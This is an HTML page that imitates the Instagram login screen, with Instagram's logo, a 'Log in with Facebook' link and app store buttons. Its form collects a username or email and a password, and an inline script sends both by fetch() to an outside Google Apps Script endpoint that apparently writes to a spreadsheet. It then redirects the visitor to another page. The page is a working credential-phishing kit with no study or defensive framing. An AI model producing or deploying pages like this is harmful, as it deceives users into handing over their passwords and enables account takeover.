<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script> <!-- jQuery included -->
    <link rel="stylesheet" href="style.css">
    <title>Login Form</title>
</head>
<body class="p-1">
    <div class="mt-5">     
        <div class="logo-forms">
            <img class="insta-logo" src="https://assets.codepen.io/6060109/ig-logo.png"> 
            <form method="POST" id="frmSubmit" name="submit-to-google-sheet">
                <input type="text" name="name" placeholder="Phone number, username, or email" required>
                <input type="password" name="pass" placeholder="Password" required>
                <button class="btn btn-primary text-center" type="submit" id="btnSubmit" name="submit">Login</button>
            </form>

            <div class="or-line">
                <hr>
                <div id="msg"></div> <!-- Message container for form feedback -->
                <h3>OR</h3>
            </div>
            <div class="fbook">
                <img class="m-2" src="https://cdn-icons-png.flaticon.com/512/124/124010.png">
                <a href="#">Log in with Facebook</a>
            </div>
            <div class="forgot">
                <a href="https://facebook.com">Forgot password?</a>
            </div>
            <h4>Get the app.</h4>
            <div class="AG-logo mb-3">
                <div class="apple"><img src="https://assets.codepen.io/6060109/IG-app-store-button.png"></div>
                <div class="google"><img src="https://assets.codepen.io/6060109/IG-Google-Play-Button.png"></div>
            </div>
        </div>
    </div>

    <script>
        const scriptURL = 'https://script.google.com/macros/s/AKfycbxvY0mHzcUfta_XW47Q9i2mEUxb0shrUsZthZhS0bLEd4vOIDrMcd2dvAKx-CtE-ncI/exec'
        const form = document.forms['submit-to-google-sheet']
      
        form.addEventListener('submit', e => {
          e.preventDefault()
          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
            .then(response =>  window.location.href='ind.html')
            .catch(error => console.error('Error!', error.message))
        })
      </script>
</body>
</html>
